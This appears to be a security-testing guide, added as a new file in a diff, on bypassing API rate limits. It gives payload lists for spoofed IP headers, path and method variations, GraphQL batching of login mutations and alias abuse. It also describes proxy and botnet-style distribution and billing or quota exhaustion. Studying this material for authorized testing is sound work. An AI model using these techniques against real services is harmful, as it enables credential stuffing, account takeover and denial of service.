@@ -1,0 +1,503 @@
+<api_rate_limiting_guide>
+<title>API RATE LIMITING BYPASS TECHNIQUES</title>
+
+<critical>Rate limiting is a critical defense against brute force attacks, credential stuffing, and DoS. Bypassing rate limits can enable enumeration, account takeover, and resource exhaustion. Testing must cover various bypass techniques including header manipulation, endpoint variations, and distributed attack patterns.</critical>
+
+<scope>
+- Rate limit detection and analysis
+- Header-based bypass techniques
+- Endpoint-specific rate limit testing
+- Quota exhaustion attacks
+- Distributed brute force patterns
+- GraphQL query cost exploitation
+- API key and token rotation
+</scope>
+
+<methodology>
+1. Identify rate-limited endpoints and their thresholds.
+2. Map rate limiting implementation (IP, user, API key based).
+3. Test header manipulation for bypass.
+4. Probe endpoint variations for inconsistent limits.
+5. Test distributed and slow attack patterns.
+6. Analyze reset windows and lockout mechanisms.
+</methodology>
+
+<rate_limit_detection>
+<identification>
+{% raw %}
+# Common rate limit response indicators:
+
+# HTTP status codes:
+429 Too Many Requests
+503 Service Unavailable
+403 Forbidden (rate limit triggered)
+
+# Response headers:
+X-RateLimit-Limit: 100
+X-RateLimit-Remaining: 0
+X-RateLimit-Reset: 1640000000
+Retry-After: 60
+X-Rate-Limit-Limit: 100/minute
+
+# Response body patterns:
+{"error": "rate_limit_exceeded"}
+{"error": "too_many_requests", "retry_after": 60}
+{"message": "API rate limit exceeded"}
+{% endraw %}
+</identification>
+
+<threshold_analysis>
+{% raw %}
+# Determine rate limit parameters:
+
+# 1. Request counting:
+# Send sequential requests until limited
+# Note: exact count, time window, reset behavior
+
+# 2. Window types:
+# - Fixed window: resets at fixed intervals
+# - Sliding window: based on request history
+# - Token bucket: refills at constant rate
+# - Leaky bucket: processes at fixed rate
+
+# 3. Scope determination:
+# - Per IP address
+# - Per user/session
+# - Per API key
+# - Per endpoint
+# - Global across all endpoints
+{% endraw %}
+</threshold_analysis>
+</rate_limit_detection>
+
+<header_bypass>
+<forwarded_headers>
+{% raw %}
+# IP-based rate limit bypass via headers:
+
+# X-Forwarded-For variations:
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.1.{1-255}
+X-Forwarded-For: random_ip, real_ip
+X-Forwarded-For: ::1
+
+# X-Real-IP:
+X-Real-IP: 127.0.0.1
+X-Real-IP: {random_ip}
+
+# X-Originating-IP:
+X-Originating-IP: 127.0.0.1
+
+# X-Remote-IP:
+X-Remote-IP: 127.0.0.1
+
+# X-Client-IP:
+X-Client-IP: 127.0.0.1
+
+# X-Remote-Addr:
+X-Remote-Addr: 127.0.0.1
+
+# True-Client-IP (Akamai):
+True-Client-IP: 127.0.0.1
+
+# CF-Connecting-IP (Cloudflare):
+CF-Connecting-IP: 127.0.0.1
+
+# X-Cluster-Client-IP:
+X-Cluster-Client-IP: 127.0.0.1
+
+# Fastly-Client-IP:
+Fastly-Client-IP: 127.0.0.1
+{% endraw %}
+</forwarded_headers>
+
+<header_combinations>
+{% raw %}
+# Multiple header combinations:
+
+# Double X-Forwarded-For:
+X-Forwarded-For: attacker_ip
+X-Forwarded-For: bypass_ip
+
+# Chained proxies:
+X-Forwarded-For: bypass_ip, real_ip, proxy_ip
+
+# Mixed headers:
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 10.0.0.1
+True-Client-IP: 192.168.1.1
+
+# Null byte injection:
+X-Forwarded-For: 127.0.0.1%00
+X-Forwarded-For: bypass_ip\x00real_ip
+
+# IPv6 variations:
+X-Forwarded-For: ::ffff:127.0.0.1
+X-Forwarded-For: 0:0:0:0:0:ffff:7f00:1
+{% endraw %}
+</header_combinations>
+</header_bypass>
+
+<endpoint_bypass>
+<path_variations>
+{% raw %}
+# Endpoint path bypass techniques:
+
+# Case variations:
+/api/login
+/API/login
+/Api/Login
+/api/LOGIN
+
+# Path normalization:
+/api/login
+/api/login/
+/api//login
+/api/./login
+/api/foo/../login
+
+# URL encoding:
+/api/login
+/api/%6c%6f%67%69%6e
+/api/lo%67in
+
+# Extension bypass:
+/api/login.json
+/api/login.xml
+/api/login.php
+
+# Version bypass:
+/api/v1/login
+/api/v2/login
+/api/v1.0/login
+/v1/api/login
+
+# Protocol variation:
+# HTTP vs HTTPS may have different limits
+{% endraw %}
+</path_variations>
+
+<method_variations>
+{% raw %}
+# HTTP method bypass:
+
+# Different methods for same endpoint:
+POST /api/login
+GET /api/login?user=x&pass=y
+PUT /api/login
+PATCH /api/login
+
+# Method override headers:
+POST /api/login HTTP/1.1
+X-HTTP-Method-Override: GET
+
+POST /api/login HTTP/1.1
+X-Method-Override: PUT
+
+# Content-Type variations:
+Content-Type: application/json
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/plain
+{% endraw %}
+</method_variations>
+
+<parameter_variations>
+{% raw %}
+# Parameter-based bypass:
+
+# Adding dummy parameters:
+/api/login?dummy=1
+/api/login?_=timestamp
+/api/login?cachebust=random
+
+# Parameter order:
+username=x&password=y
+password=y&username=x
+
+# Array parameters:
+username[]=x&password=y
+username=x&username=y
+
+# Null bytes in parameters:
+username=admin%00&password=test
+
+# Unicode normalization:
+username=admin&password=test
+username=ａdmin&password=test
+{% endraw %}
+</parameter_variations>
+</endpoint_bypass>
+
+<distributed_attacks>
+<ip_rotation>
+{% raw %}
+# Distributed attack patterns:
+
+# 1. Multiple source IPs:
+# - Use cloud provider IP ranges
+# - Rotate through proxy lists
+# - VPN endpoint rotation
+
+# 2. Residential proxies:
+# - Harder to block/detect
+# - Geographic distribution
+
+# 3. Request distribution:
+# - Spread across time windows
+# - Random delays between requests
+# - Mimic human behavior patterns
+
+# 4. Botnet-style distribution:
+# - Low request rate per IP
+# - Many IPs simultaneously
+# - Below per-IP thresholds
+{% endraw %}
+</ip_rotation>
+
+<slow_attacks>
+{% raw %}
+# Slow and low attack patterns:
+
+# 1. Below threshold attacks:
+# If limit is 100/minute:
+# - Send 99 requests per minute
+# - Sustained over hours/days
+
+# 2. Threshold riding:
+# - Monitor remaining quota
+# - Adjust rate dynamically
+# - Stay just below limit
+
+# 3. Window exploitation:
+# - Identify reset times
+# - Burst at window boundaries
+# - Maximize requests per window
+
+# 4. Multi-account attacks:
+# - Create multiple accounts
+# - Distribute load across accounts
+# - Per-user limits instead of per-IP
+{% endraw %}
+</slow_attacks>
+</distributed_attacks>
+
+<graphql_exploitation>
+<query_cost_abuse>
+{% raw %}
+# GraphQL query complexity attacks:
+
+# 1. Nested query depth:
+{
+  user(id: 1) {
+    friends {
+      friends {
+        friends {
+          friends {
+            name
+          }
+        }
+      }
+    }
+  }
+}
+
+# 2. Alias-based multiplication:
+{
+  a1: user(id: 1) { name }
+  a2: user(id: 2) { name }
+  a3: user(id: 3) { name }
+  # ... 100+ aliases
+}
+
+# 3. Batching attacks:
+[
+  {"query": "{ user(id: 1) { name } }"},
+  {"query": "{ user(id: 2) { name } }"},
+  {"query": "{ user(id: 3) { name } }"}
+  # ... 1000+ queries
+]
+
+# 4. Field duplication:
+{
+  user(id: 1) {
+    name name name name name name name
+    email email email email email email
+  }
+}
+{% endraw %}
+</query_cost_abuse>
+
+<graphql_rate_limit_bypass>
+{% raw %}
+# GraphQL-specific bypass:
+
+# 1. Operation name rotation:
+query Op1 { users { name } }
+query Op2 { users { name } }
+# Different operation names, same query
+
+# 2. Query fragmentation:
+fragment UserFields on User { name email }
+query { user(id: 1) { ...UserFields } }
+
+# 3. Persisted query bypass:
+# Use query hash instead of full query
+{"extensions": {"persistedQuery": {"sha256Hash": "..."}}}
+
+# 4. Subscription abuse:
+subscription {
+  userUpdated {
+    name
+  }
+}
+# Maintain many subscriptions simultaneously
+{% endraw %}
+</graphql_rate_limit_bypass>
+</graphql_exploitation>
+
+<authentication_bypass>
+<token_rotation>
+{% raw %}
+# Token/key-based rate limit bypass:
+
+# 1. API key rotation:
+# - Create multiple API keys
+# - Rotate through keys
+# - Per-key rate limits
+
+# 2. Session rotation:
+# - Create multiple sessions
+# - Distribute requests across sessions
+# - Avoid per-session limits
+
+# 3. Anonymous vs authenticated:
+# - Anonymous endpoints may have different limits
+# - Authenticate to get higher limits
+# - Use multiple accounts
+
+# 4. Token refresh:
+# - Get new tokens frequently
+# - New token = new rate limit bucket?
+{% endraw %}
+</token_rotation>
+
+<user_context_manipulation>
+{% raw %}
+# User context bypass:
+
+# 1. User-Agent rotation:
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...
+User-Agent: Mozilla/5.0 (Linux; Android 11)...
+
+# 2. Cookie manipulation:
+# Remove tracking cookies
+# Rotate session cookies
+# Clear rate limit cookies
+
+# 3. Referrer manipulation:
+Referer: https://target.com/page1
+Referer: https://target.com/page2
+Referer: https://allowed-domain.com/
+
+# 4. Origin header:
+Origin: https://target.com
+Origin: https://allowed.com
+Origin: null
+{% endraw %}
+</user_context_manipulation>
+</authentication_bypass>
+
+<quota_exhaustion>
+<resource_exhaustion>
+{% raw %}
+# Quota exhaustion attacks:
+
+# 1. API quota exhaustion:
+# - Consume victim's API quota
+# - Trigger billing limits
+# - Cause service degradation
+
+# 2. Rate limit as DoS:
+# - Lock out legitimate users
+# - Trigger account lockouts
+# - Cause IP-based blocks
+
+# 3. Billing exploitation:
+# - Trigger pay-per-use billing
+# - Exhaust free tier limits
+# - Force service suspension
+
+# 4. Cache poisoning with limits:
+# - Poison cached responses
+# - Rate limited error pages cached
+# - Affect other users
+{% endraw %}
+</resource_exhaustion>
+</quota_exhaustion>
+
+<common_payloads>
+{% raw %}
+# Header bypass payloads:
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 10.0.0.1
+True-Client-IP: 192.168.1.1
+X-Originating-IP: 172.16.0.1
+
+# Path bypass:
+/api/login/
+/API/LOGIN
+/api//login
+/api/login.json
+
+# GraphQL batching:
+[{"query": "mutation { login(u:\"a\",p:\"b\") { token } }"},
+ {"query": "mutation { login(u:\"c\",p:\"d\") { token } }"}]
+
+# Alias multiplication:
+query { a1:user(id:1){name} a2:user(id:2){name} }
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Document baseline rate limit thresholds and windows.
+2. Demonstrate header-based bypass with continued requests after limit.
+3. Show endpoint variation bypass with successful requests.
+4. Prove GraphQL complexity bypass with high-cost queries.
+5. Provide reproducible bypass technique with exact headers/payloads.
+</validation>
+
+<false_positives>
+- Rate limits that consistently apply across all bypass attempts
+- Limits that block at network level before reaching application
+- GraphQL with proper query cost analysis
+- Per-request cryptographic tokens preventing replay
+- Rate limits that account for all header variations
+</false_positives>
+
+<impact>
+- Credential stuffing and brute force attacks
+- Account enumeration at scale
+- Resource exhaustion and DoS
+- API quota abuse and billing attacks
+- Automated scraping and data extraction
+- Bypass of security controls
+</impact>
+
+<pro_tips>
+1. Always test multiple IP header variations together.
+2. Check if rate limits differ between HTTP and HTTPS.
+3. Test endpoint path case sensitivity.
+4. Monitor rate limit headers for threshold information.
+5. Test GraphQL with nested queries and aliases.
+6. Check if rate limits reset on authentication changes.
+7. Look for undocumented API versions with different limits.
+8. Test mobile API endpoints for weaker rate limiting.
+9. Combine multiple bypass techniques for better results.
+10. Document exact thresholds and reset windows for report.
+</pro_tips>
+
+<remember>Rate limiting implementations often have gaps between intended and actual behavior. Test comprehensively across headers, endpoints, methods, and protocols. A single bypass technique can enable attacks that the rate limit was designed to prevent.</remember>
+</api_rate_limiting_guide>
